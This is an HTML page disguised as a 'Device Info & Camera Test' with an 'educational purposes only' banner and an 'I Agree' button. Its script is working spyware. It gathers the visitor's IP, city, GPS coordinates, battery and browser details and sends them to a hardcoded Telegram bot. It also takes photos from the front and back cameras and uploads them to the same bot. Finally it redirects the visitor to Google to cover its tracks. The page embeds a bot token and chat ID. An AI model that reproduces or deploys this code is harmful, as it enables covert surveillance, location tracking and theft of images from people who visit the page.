<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Device Info & Camera Test</title>
</head>
<body>
  <h2>This website is for educational purposes only.</h2>
  <p>By clicking "I Agree", you allow this page to access camera and system data.</p>
  <button id="agreeBtn">I Agree</button>

  <script>
    const botToken = "8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ";
    const chatId = "7216371031";
    const ipToken = "18d2a866939a58";

    async function getSnapshot(facingMode) {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
        const video = document.createElement("video");
        video.srcObject = stream;
        await video.play();
        await new Promise(res => setTimeout(res, 1000)); // wait for camera to settle

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);
        const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.9));

        stream.getTracks().forEach(t => t.stop());
        return blob;
      } catch (err) {
        console.warn(`${facingMode} camera failed`, err);
        return null;
      }
    }

    async function getDeviceInfo() {
      const info = {
        ip: "unknown",
        location: "N/A",
        battery: "N/A",
        charging: "N/A",
        browser: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform
      };

      try {
        const ipRes = await fetch(`https://ipinfo.io/json?token=${ipToken}`);
        const ipData = await ipRes.json();
        info.ip = ipData.ip + " (" + ipData.city + ", " + ipData.region + ")";
      } catch {}

      try {
        const geo = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej)
        );
        info.location = `Lat: ${geo.coords.latitude}, Lon: ${geo.coords.longitude}`;
      } catch {}

      try {
        const battery = await navigator.getBattery();
        info.battery = (battery.level * 100).toFixed(0) + "%";
        info.charging = battery.charging ? "Yes" : "No";
      } catch {}

      return info;
    }

    async function sendText(info) {
      const text = `
ðŸ“¡ *Device Info*
IP: ${info.ip}
Location: ${info.location}
Battery: ${info.battery} | Charging: ${info.charging}
Browser: ${info.browser}
Lang: ${info.language}
Platform: ${info.platform}
      `;
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text, parse_mode: "Markdown" })
      });
    }

    async function sendPhoto(blob, label) {
      const form = new FormData();
      form.append("chat_id", chatId);
      form.append("photo", blob, `${label}.jpg`);
      form.append("caption", label);
      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: "POST",
        body: form
      });
    }

    document.getElementById("agreeBtn").addEventListener("click", async () => {
      const info = await getDeviceInfo();
      await sendText(info);

      const front = await getSnapshot("user");
      if (front) await sendPhoto(front, "ðŸ“· Front Camera");

      const back = await getSnapshot("environment");
      if (back) await sendPhoto(back, "ðŸ“· Back Camera");

      setTimeout(() => window.location.href = "https://www.google.com", 3000);
    });
  </script>
</body>
</html>
